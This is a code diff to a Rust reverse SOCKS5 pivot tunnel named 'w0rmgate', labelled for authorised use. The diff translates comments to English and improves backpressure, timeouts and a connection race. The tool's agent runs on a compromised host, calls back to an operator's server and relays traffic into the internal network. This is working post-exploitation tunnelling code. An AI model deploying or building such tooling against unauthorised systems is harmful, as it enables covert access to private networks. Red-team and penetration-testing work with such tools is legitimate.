@@ -6,14 +6,19 @@ use clap::{Parser, Subcommand};
 use proto::{read_frame, write_frame, Frame};
 use std::collections::HashMap;
 use std::sync::Arc;
+use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
 use tokio::sync::{mpsc, Mutex};
+use tokio::time::timeout;
 
 type Streams = Arc<Mutex<HashMap<u32, mpsc::UnboundedSender<Vec<u8>>>>>;
-type Out = mpsc::UnboundedSender<Frame>;
+type Out = mpsc::Sender<Frame>;
 
-/// w0rmgate — túnel SOCKS5 reverso para pivoting autorizado.
+const OUT_BUF: usize = 1024;
+const DIAL_TIMEOUT: Duration = Duration::from_secs(10);
+
+/// w0rmgate — reverse SOCKS5 pivot tunnel (authorised use only).
 #[derive(Parser)]
 #[command(name = "w0rmgate", version, about)]
 struct Cli {
@@ -23,46 +28,41 @@ struct Cli {
 
 #[derive(Subcommand)]
 enum Cmd {
-    /// Lado do operador: recebe o agente e expõe o proxy SOCKS5.
+    /// Operator side: accepts the agent and exposes the SOCKS5 proxy.
     Server {
-        /// Onde o agente liga de volta.
+        /// Address the agent connects back to.
         #[arg(long, default_value = "0.0.0.0:7000")]
         control: String,
-        /// Proxy SOCKS5 para o operador usar.
+        /// SOCKS5 proxy for the operator to use.
         #[arg(long, default_value = "127.0.0.1:1080")]
         socks: String,
     },
-    /// Lado do host comprometido: liga de volta e dá saída na rede interna.
+    /// Compromised-host side: connects back and egresses onto the internal network.
     Agent {
-        /// Endereço de controle do server (operador).
+        /// Control address of the operator's server.
         #[arg(long)]
         connect: String,
     },
 }
 
-/// Lê do socket local e empurra DATA para o túnel; no fim manda CLOSE.
-async fn local_to_mux<R: AsyncReadExt + Unpin>(
-    mut rd: R,
-    id: u32,
-    out: Out,
-    streams: Streams,
-) {
+/// Reads from the local socket and pushes DATA into the tunnel; sends CLOSE at EOF.
+async fn local_to_mux<R: AsyncReadExt + Unpin>(mut rd: R, id: u32, out: Out, streams: Streams) {
     let mut buf = vec![0u8; 16 * 1024];
     loop {
         match rd.read(&mut buf).await {
             Ok(0) | Err(_) => break,
             Ok(n) => {
-                if out.send(Frame::data(id, buf[..n].to_vec())).is_err() {
+                if out.send(Frame::data(id, buf[..n].to_vec())).await.is_err() {
                     break;
                 }
             }
         }
     }
-    let _ = out.send(Frame::close(id));
+    let _ = out.send(Frame::close(id)).await;
     streams.lock().await.remove(&id);
 }
 
-/// Recebe DATA do túnel e escreve no socket local.
+/// Receives DATA from the tunnel and writes it to the local socket.
 async fn mux_to_local<W: AsyncWriteExt + Unpin>(
     mut wr: W,
     mut rx: mpsc::UnboundedReceiver<Vec<u8>>,
@@ -75,8 +75,8 @@ async fn mux_to_local<W: AsyncWriteExt + Unpin>(
     let _ = wr.shutdown().await;
 }
 
-/// Tarefa escritora: serializa frames de muitas tasks no socket de controle.
-async fn writer_task<W: AsyncWriteExt + Unpin>(mut wr: W, mut rx: mpsc::UnboundedReceiver<Frame>) {
+/// Writer task: serialises frames from many tasks onto the control socket.
+async fn writer_task<W: AsyncWriteExt + Unpin>(mut wr: W, mut rx: mpsc::Receiver<Frame>) {
     while let Some(f) = rx.recv().await {
         if write_frame(&mut wr, &f).await.is_err() {
             break;
@@ -86,25 +86,26 @@ async fn writer_task<W: AsyncWriteExt + Unpin>(mut wr: W, mut rx: mpsc::Unbounde
 
 async fn run_server(control: String, socks_addr: String) -> Result<()> {
     let ctrl_listener = TcpListener::bind(&control).await?;
-    eprintln!("[*] controle escutando em {control} (aguardando agente)");
+    eprintln!("[*] control listening on {control} (waiting for agent)");
     loop {
         let (agent, peer) = ctrl_listener.accept().await?;
-        eprintln!("[+] agente conectado: {peer}");
+        let _ = agent.set_nodelay(true);
+        eprintln!("[+] agent connected: {peer}");
         if let Err(e) = serve_agent(agent, &socks_addr).await {
-            eprintln!("[!] sessão encerrada: {e}");
+            eprintln!("[!] session ended: {e}");
         }
-        eprintln!("[*] aguardando novo agente...");
+        eprintln!("[*] waiting for a new agent...");
     }
 }
 
 async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
     let (mut ar, aw) = agent.into_split();
-    let (out_tx, out_rx) = mpsc::unbounded_channel::<Frame>();
+    let (out_tx, out_rx) = mpsc::channel::<Frame>(OUT_BUF);
     let streams: Streams = Arc::new(Mutex::new(HashMap::new()));
 
     tokio::spawn(writer_task(aw, out_rx));
 
-    // leitor do túnel: distribui DATA/CLOSE para os streams locais
+    // tunnel reader: dispatches DATA/CLOSE to the local streams
     let streams_r = streams.clone();
     let reader = tokio::spawn(async move {
         loop {
@@ -114,7 +115,8 @@ async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
             };
             match f.kind {
                 proto::DATA => {
-                    if let Some(tx) = streams_r.lock().await.get(&f.id) {
+                    let tx = streams_r.lock().await.get(&f.id).cloned();
+                    if let Some(tx) = tx {
                         let _ = tx.send(f.data);
                     }
                 }
@@ -126,13 +128,14 @@ async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
         }
     });
 
-    // aceitador SOCKS do operador
+    // SOCKS acceptor for the operator
     let socks_listener = TcpListener::bind(socks_addr).await?;
-    eprintln!("[*] SOCKS5 pronto em {socks_addr}");
+    eprintln!("[*] SOCKS5 ready on {socks_addr}");
     let mut next_id: u32 = 1;
     let acceptor = async {
         loop {
             let (mut cli, _) = socks_listener.accept().await?;
+            let _ = cli.set_nodelay(true);
             let target = match socks::handshake(&mut cli).await {
                 Ok(t) => t,
                 Err(_) => continue,
@@ -141,7 +144,9 @@ async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
             next_id = next_id.wrapping_add(1).max(1);
             let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
             streams.lock().await.insert(id, tx);
-            let _ = out_tx.send(Frame::open(id, &target));
+            if out_tx.send(Frame::open(id, &target)).await.is_err() {
+                break;
+            }
             let (cr, cw) = cli.into_split();
             tokio::spawn(mux_to_local(cw, rx));
             tokio::spawn(local_to_mux(cr, id, out_tx.clone(), streams.clone()));
@@ -151,7 +156,8 @@ async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
     };
 
     tokio::select! {
-        _ = reader => { eprintln!("[!] agente desconectou"); }
+        _ = reader => {            eprintln!("[!] agent disconnected");
+        }
         r = acceptor => { r?; }
     }
     Ok(())
@@ -159,23 +165,24 @@ async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
 
 async fn run_agent(connect: String) -> Result<()> {
     loop {
-        eprintln!("[*] ligando de volta para {connect}");
+        eprintln!("[*] connecting back to {connect}");
         match TcpStream::connect(&connect).await {
             Ok(s) => {
-                eprintln!("[+] túnel estabelecido");
+                let _ = s.set_nodelay(true);
+                eprintln!("[+] tunnel established");
                 if let Err(e) = agent_session(s).await {
-                    eprintln!("[!] túnel caiu: {e}");
+                    eprintln!("[!] tunnel dropped: {e}");
                 }
             }
-            Err(e) => eprintln!("[!] falha ao conectar: {e}"),
+            Err(e) => eprintln!("[!] connect failed: {e}"),
         }
-        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+        tokio::time::sleep(Duration::from_secs(5)).await;
     }
 }
 
 async fn agent_session(server: TcpStream) -> Result<()> {
     let (mut sr, sw) = server.into_split();
-    let (out_tx, out_rx) = mpsc::unbounded_channel::<Frame>();
+    let (out_tx, out_rx) = mpsc::channel::<Frame>(OUT_BUF);
     let streams: Streams = Arc::new(Mutex::new(HashMap::new()));
     tokio::spawn(writer_task(sw, out_rx));
 
@@ -187,23 +194,29 @@ async fn agent_session(server: TcpStream) -> Result<()> {
                 let id = f.id;
                 let out = out_tx.clone();
                 let streams = streams.clone();
+                // Register the stream channel BEFORE dialing so DATA frames that
+                // arrive mid-connect are queued instead of dropped (head-of-line
+                // race between OPEN's async connect and the follow-up DATA).
+                let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
+                streams.lock().await.insert(id, tx);
                 tokio::spawn(async move {
-                    match TcpStream::connect(&target).await {
-                        Ok(dst) => {
+                    match timeout(DIAL_TIMEOUT, TcpStream::connect(&target)).await {
+                        Ok(Ok(dst)) => {
+                            let _ = dst.set_nodelay(true);
                             let (dr, dw) = dst.into_split();
-                            let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
-                            streams.lock().await.insert(id, tx);
                             tokio::spawn(mux_to_local(dw, rx));
                             local_to_mux(dr, id, out, streams).await;
                         }
-                        Err(_) => {
-                            let _ = out.send(Frame::close(id));
+                        _ => {
+                            streams.lock().await.remove(&id);
+                            let _ = out.send(Frame::close(id)).await;
                         }
                     }
                 });
             }
             proto::DATA => {
-                if let Some(tx) = streams.lock().await.get(&f.id) {
+                let tx = streams.lock().await.get(&f.id).cloned();
+                if let Some(tx) = tx {
                     let _ = tx.send(f.data);
                 }
             }
